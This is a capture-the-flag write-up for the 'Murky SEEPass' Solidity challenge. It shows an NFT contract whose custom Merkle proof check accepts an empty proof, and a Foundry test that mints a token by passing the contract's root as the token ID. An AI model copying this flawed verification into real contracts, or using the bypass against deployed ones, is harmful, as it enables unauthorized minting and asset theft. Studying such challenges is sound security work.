# Murky SEEPass

## Challenge

In this challenge, we are provided with 2 contracts. The SEEPass which is an ERC721 and the Merkleproof.sol which "should" be used to verify MerkleProofs.

SEEPass.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./MerkleProof.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract SEEPass is ERC721 {
    bytes32 private _merkleRoot;
    mapping(uint256 => bool) private _minted;

    constructor(bytes32 _root) ERC721("SEE Pass", "SEEP") {
        _merkleRoot = _root;
    }

    function mintSeePass(bytes32[] calldata _proof, uint256 _tokenId) public {
        require(!hasMinted(_tokenId), "Already minted");
        require(verify(_proof, _merkleRoot, _tokenId), "Invalid proof");

        _minted[_tokenId] = true;

        _safeMint(msg.sender, _tokenId);
    }

    function verify(bytes32[] calldata proof, bytes32 root, uint256 index) public pure returns (bool) {
        return MerkleProof.verify(proof, root, index);
    }

    function hasMinted(uint256 _tokenId) public view returns (bool) {
        return _minted[_tokenId];
    }
}

```

Merkleproof.sol
```solidity
// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.0;

library MerkleProof {
    // Verify a Merkle proof proving the existence of a leaf in a Merkle tree. Assumes that each pair of leaves and each pair of pre-images in the proof are sorted.
    function verify(bytes32[] calldata proof, bytes32 root, uint256 index) internal pure returns (bool) {
        bytes32 computedHash = bytes32(abi.encodePacked(index));

        require(root != bytes32(0), "MerkleProof: Root hash cannot be zero");
        require(computedHash != bytes32(0), "MerkleProof: Leaf hash cannot be zero");

        for (uint256 i = 0; i < proof.length; i++) {
            bytes32 proofElement = proof[i];

            if (computedHash < proofElement) {
                // Hash(current computed hash + current element of the proof)
                computedHash = keccak256(abi.encodePacked(computedHash, proofElement));
            } else {
                // Hash(current element of the proof + current computed hash)
                computedHash = keccak256(abi.encodePacked(proofElement, computedHash));
            }
        }

        // Check if the computed hash (root) is equal to the provided root
        return computedHash == root;
    }
}
```

Our goal is to get one NFT.

## Solution
The key part of a Merkle tree is the root. In this case, it's set to private so we are not intended to see it. Nevertheless, we can easily retrieve it using web3.js/cast. It is 0xd158416f477eb6632dd0d44117c33220be333a420cd377fab5a00fdb72d27a10. I found it online as I did this challenge after the CTF was already over and the infra was gone.

After that, I took a look at the functions inside the contract. I quickly found the vulnerability inside the MerkleProof contract. The function verify() is missing a check if the proof has a length of 0. Because in this case, we can pass an empty proof and the root as the index, which will return true.

As I only got to do this without a deployed chal, I used my [ParadigmCTFDebugTemplate](https://github.com/J4X-98/SolidityCTFToolkit/blob/main/forge/paradigmTester.sol) to simulate and debug the challenge. Here you can see my test case as well as the calls I made to solve the chal.

```solidity
// Description:
// A forge testcase which you can use to easily debug challenges that were built using the Paradigm CTF framework.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
//Import all needed contracts here (they are usually stored in /src in your foundry directory)
import "../src/SEEPass.sol";

contract ParadigmTest is Test {
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    //Initialize any additional needed variables here
    SEEPass public pass;

    function setUp() public {
        vm.deal(deployer, 2500 ether);
        vm.startPrank(deployer);

        //Copy all code from the Setup.sol constructor() function into here
        pass = new SEEPass(0xd158416f477eb6632dd0d44117c33220be333a420cd377fab5a00fdb72d27a10);

        vm.stopPrank();
    }

    function test() public {
        //30 eth are the standard for the paradigm framework, but this could be configured differently, you can easily check this by importing the rpc url and private key into metamask and checking the balance of the deployer account
        vm.deal(attacker, 10 ether); 
        vm.startPrank(attacker);

        //Code your solution here
        bytes32[] memory emptyProof;
        pass.mintSeePass(emptyProof, 0xd158416f477eb6632dd0d44117c33220be333a420cd377fab5a00fdb72d27a10);

        vm.stopPrank();
        assertEq(isSolved(), true);
    }

    function isSolved() public view returns (bool) {
        //Copy the content of the isSolved() function from the Setup.sol contract here
        return pass.balanceOf(address(attacker)) > 0;
    }
}
```

